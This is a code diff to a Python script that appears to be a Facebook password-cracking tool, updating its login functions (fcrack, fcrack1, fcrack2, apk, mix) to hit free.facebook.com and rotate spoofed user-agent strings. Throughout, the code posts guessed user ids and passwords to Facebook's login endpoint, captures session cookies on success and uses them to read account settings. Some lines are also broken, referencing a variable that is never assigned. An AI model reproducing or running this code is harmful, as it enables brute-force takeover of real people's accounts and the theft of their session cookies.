@@ -132,12 +132,12 @@ loop = 0
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://mbasic.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 ugen=[]
 uas=[]
-usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
+usa = ["Mozilla/5.0 Windows NT 11.0; Win64) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
 rr = random.randint
 for xd in range(10000):
     aa='Mozilla/5.0 (Linux; U; Android'
@@ -270,7 +270,7 @@ uid = []
 
 #---------------------[APPLICATION CHECKER]---------------------#
 def cek_apk(session,coki):
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -650,7 +650,7 @@ def apk(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            mbasic_fb = session.get('https://mbasic.facebook.com').text
+            mbasic_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -674,9 +674,8 @@ def apk(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36',
-}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36',}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -709,7 +708,7 @@ def mix(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            free_fb = session.get('https://x.facebook.com').text 
+            free_fb = session.get('https://free.facebook.com').text 
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -733,9 +732,8 @@ def mix(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36',
-}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36',}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -767,7 +765,7 @@ def fcrack(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            mbasic_fb = session.get('https://mbasic.facebook.com').text 
+            mbasic_fb = session.get('https://free.facebook.com').text 
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -791,9 +789,8 @@ def fcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36',
-}
-            lo = session.post('https://mabasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36',}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -825,7 +822,7 @@ def fcrack1(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            mbasic_fb = session.get('https://mbasic.facebook.com').text
+            mbasic_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -849,9 +846,8 @@ def fcrack1(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36',
-}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36',}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -885,7 +881,7 @@ def fcrack2(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            mbasic_fb = session.get('https://mbasic.facebook.com').text
+            mbasic_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -909,9 +905,8 @@ def fcrack2(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36',
-}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36',}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
